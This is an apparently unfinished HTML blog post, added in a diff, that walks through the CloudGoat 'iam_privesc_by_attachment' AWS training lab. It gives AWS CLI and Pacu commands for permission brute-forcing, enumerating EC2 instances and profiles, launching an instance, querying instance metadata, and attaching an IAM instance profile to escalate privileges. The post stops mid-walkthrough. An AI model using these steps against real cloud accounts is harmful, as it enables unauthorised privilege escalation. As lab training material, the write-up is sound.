@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <script src="../static/js/nav.js"></script>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+  <link rel="stylesheet" href="../static/css/main.css">
+</head>
+<body>
+
+    <div class="site-wrapper">
+      <div class="sticky top-bar"> 
+        <div id="mySidenav" class="sidenav sticky" include-nav="/static/nav.html">
+        </div>
+        <span class="sticky hamburger" style="font-size:30px;cursor:pointer" onclick="openNav()">&#9776;</span>
+      </div>
+
+    
+        <div class="container">
+            <div class="blog-header">
+                <h1 class="blog-title" id="top">iam_privesc_by_attachment</h1>
+                <hr>
+              </div>
+        
+              <div class="row">
+        
+                <div class="col-sm-8 blog-main">
+                    <div class="blog-post" data-spy="scroll" data-target="#sidebar" data-offset="15">
+                        <p>Once the scenario is creation process completes we are presented with a set of access keys for a user account 'kerrigan'</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/initial_user.png" alt="Initial User" class="img-fluid">
+                        <hr>
+                        <h3 id="whoami">whoami</h3>
+                        <p>First lets make sure the credentials that we have obtained are valid:</p>
+                        <pre><code>aws sts get-caller-identity --profile xxx |jq</code></pre>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/whoami.png" alt="whoami" class="img-fluid">
+                        <p>Perfect, looks like the credentials work. Now, what can they do?</p>
+                        <hr>
+                        <h3 id="what-can-i-do">What can I do?</h3>
+                        <p>Lets use pacu to brute force some permissions. We can do this by running:</p>
+                        <pre><code>run iam__bruteforce_permissions</code></pre>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/brute_force_perms.png" alt="brute_force" class="img-fluid">
+                        <p>Once the command completes we see the output below:</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/brute_force_output.png" alt="brute_force_output" class="img-fluid">
+                        <p>Overall the credentials are fairly limited. But it does look like we have the ability to learn about ec2 instances with the describe command. Lets bounce back to the aws cli and run:</p>
+                        <pre><code>aws ec2 describe-instances |jq</code></pre>
+                        <p>We get an output similar to the one below that shows us details about the instances within the us-east region of this account.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/brute_force_output.png" alt="brute_force_output" class="img-fluid">
+                        <p>Lets clean this up a little bit just for fun.</p>
+                        <pre><code>aws --profile kerrigan ec2 describe-instances |jq -r '.Reservations[0].Instances[].InstanceId,.Reservations[0].Instances[].SecurityGroups[].GroupName,.Reservations[0].Instances[].NetworkInterfaces[].Association[]'</code></pre>
+                        <p><i>*Note in the command above I set the Reservations to the value in the first index. To see all instances leave the brackets empty '[]'</i></p>
+                        <p>This cleans up the verbose output and prints the instance id, security groups, and some networking details about the instance</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/jq_fun.png" alt="jq_fun" class="img-fluid">
+                        <p>Lets see what else our permissions can do. We'll start with the instance profiles command. According to Pacu we have rights to invoke this command.</p>
+                        <pre><code>aws iam list-instance-profiles |jq</code></pre>
+                        <p>Looking at the output below we see a profile with the 'cg-ec2-meek-role' associated with it. The profile has a policy that allows for 'sts:AssumeRole'.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/iam_list_profiles.png" data-toggle="modal" data-target="#list_profiles" alt="iam_list_profiles" class="img-fluid">
+                        <p>Lets use pacu to see what instances,security groups, vpcs, and subnets exist within the environment:</p>
+                        <pre><code>run ec2__enum --region=us-east-1</code></pre>
+                        <p>Looking at the output we can see that there are currently 4 instances in the region as well as additional information that may become useful.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/ec2_enum.png" alt="ec2_enum" class="img-fluid">
+                        <p>Within Pacu running the 'data' command will dump all of the data from the current session. This will include all of the details we just enumerated about the Ec2's within the account.</p>
+                        <p>Lets head back to the aws cli and run the ec2 describe call again. This time instead of jq we will just print the output to a table.</p>
+                        <pre><code>aws --profile kerrigan ec2 describe-instances --output table</code></pre>
+                        <p>And we can see that there is an ec2 and one of the tags is that it is a ’super critical server'</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/super_critical_tag.png" alt="critical_ec2_enum" class="img-fluid">
+                        <hr>
+                        <h5 id="hard-part">The hard part</h5>
+                        <p>Considering everything that we've seen up to this point:</p>
+                        <ul>
+                            <li>A critical instance exists</li>
+                            <li>We can perform several ec2 tasks</li>
+                            <li>We don't seem to have any other permissions</li>
+                            <li>We do have some limited iam rights</li>
+                            <li>There is a ec2 profile that can assume roles</li>
+                        </ul>
+                        <p>There seems to be some potential for us to create an instance to leverage the assume role policy. Lets use Pacu to see if we have any additional iam permissions that could be of use.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/iam_permission_failure.png" alt="iam_enum" class="img-fluid">
+
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/account_iam_roles.png" alt="iam_roles" class="img-fluid">
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/mighty_role.png" alt="mighty_role" class="img-fluid">
+                        <p>In the picture above we can see that the 'mighty' role is a role associated with the ec2 service. This is a role that can be associated with an ec2 profile, and that profile can be associated with an ec2 instance.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/list_policies_error.png" alt="list_policies_error" class="img-fluid">
+
+
+
+                        <h5 id="make-ec2">Make an Ec2</h5>
+                        <p>Lets create our own ec2</p>
+                        <p>First we need a key pair:</p>
+                        <pre><code>aws ec2 create-key-pair --key-name toteslegit --profile kerrigan</code></pre>
+                        <p>Now lets save that for future use and create a ec2 using that pair:</p>
+                        <pre><code>aws ec2 run-instances --image-id ami-0a313d6098716f372 --count 1 --instance-type t2.micro --security-group-ids sg-082d358f4161c877c --subnet-id subnet-0c9d7451cc4e04e01 --key-name toteslegit --tags Key=name,Value=Toteslegit --profile kerrigan</code></pre>
+                        <p>And this is successful and returns our instance id </p>
+                        <pre><code>"InstanceId": "i-0ecf2a591e0d75d18”</code></pre>
+                        <p>Now we can ssh into the box using our key</p>
+                        <pre><code>ssh -i toteslegit ubuntu@</code></pre>
+                        <p>Now we can query the meta data service</p>
+                        <pre><code>curl http://169.254.169.254/latest/meta-data/iam/</code></pre>
+                        <p>Weird no access keys like last time….ah right no roles have been assigned yet</p>
+                        <p>So lets assign a profile</p>
+                        <pre><code>aws ec2 associate-iam-instance-profile --instance-id i-0ecf2a591e0d75d18 --iam-instance-profile Name=cg-ec2-meek-instance-profile-cgid17lgq8xa81  --profile kerrigan</code></pre>
+                        <p>And now lets ssh in</p>
+
+
+                        <!-- <img src="../static/images/Office365/flow/email_flow.png" alt="Email Flow" class="img-fluid"> -->
+
+
+                    </div><!-- /.blog-post -->
+                </div><!-- /.blog-main -->
+
+                <!-- Blog Side Bar-->
+                <div class="col-md-3" id=sidebar data-spy="affix-bottom" data-offset-top="0">
+                    
+                    <nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id="post-nav">
+                        <h5>contents</h5>
+                        <ul class="nav post-sidenav"> 
+                            <li class=""> <a href="#whoami">whoami</a> </li>
+                            <li class=""> <a href="#what-can-i-do">What can I do?</a></li>
+                            <li class=""> <a href="#persistence">Persistence</a> </li>
+                            <li class=""> <a href="#make-ec2">Make an Ec2</a></li>
+                            <li class=""> <a href="#security_controls">Security Controls</a>
+                                <ul class="nav"> 
+                                    <li class=""><a href="#control-dlp">Data Loss Prevention</a> </li>
+                                    <li class=""><a href="#control-log">Logging</a> </li> 
+                                    <li class=""><a href="#contorl-event-types">Event Types</a> </li>  
+                                    <li class=""><a href="#contorl-event-details">Event Details</a> </li> 
+                                    <li class=""><a href="#contorl-flow-details">Flow Details</a> </li>
+                                    <li class=""><a href="#contorl-quotas">Quotas</a> </li>
+                                </ul>  
+                            </li>
+                            <li class=""> <a href="#fun_nuances">Fun Nuances</a> 
+                                <ul class="nav"> 
+                                    <li class=""><a href="#fun-import">Import Pre-Built Flows</a> </li>
+                                    <li class=""><a href="#fun-disabled">Disabled Accounts</a> </li>
+                                    <li class=""><a href="#fun-special">Special Connectors</a> </li>
+                                    <li class=""><a href="#fun-failure">Flow Failures</a> </li>
+                                </ul>  
+                            </li>
+                            <li class=""> <a href="#top">Top</a> </li>
+                    </nav>
+                </div><!-- /.blog-sidebar -->
+
+            </div><!-- /.row -->
+        </div> <!--/.container-->
+    </div> <!--/.wrapper -->
+
+
+
+
+<!-- Modals -->
+<div class="modal fade" id="list_profiles" tabindex="-1" role="dialog" aria-labelledby="list_profilesModalLabel" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+        <img src="../static/images/Cloud_Goat/iam_privesc_by_attachment/iam_list_profiles.png" style="width:200%;align-self:center;">
+    </div>
+  </div>
+</div>
+<div class="modal fade" id="redressing2Modal" tabindex="-1" role="dialog" aria-labelledby="redressing2ModalLabel" aria-hidden="true">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+        <img src="../static/images/xssuiredressing2.png" style="width:300%;align-self:center;">
+    </div>
+  </div>
+</div>
+
+
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+<script>includeHTML();</script>
+</html> 
+
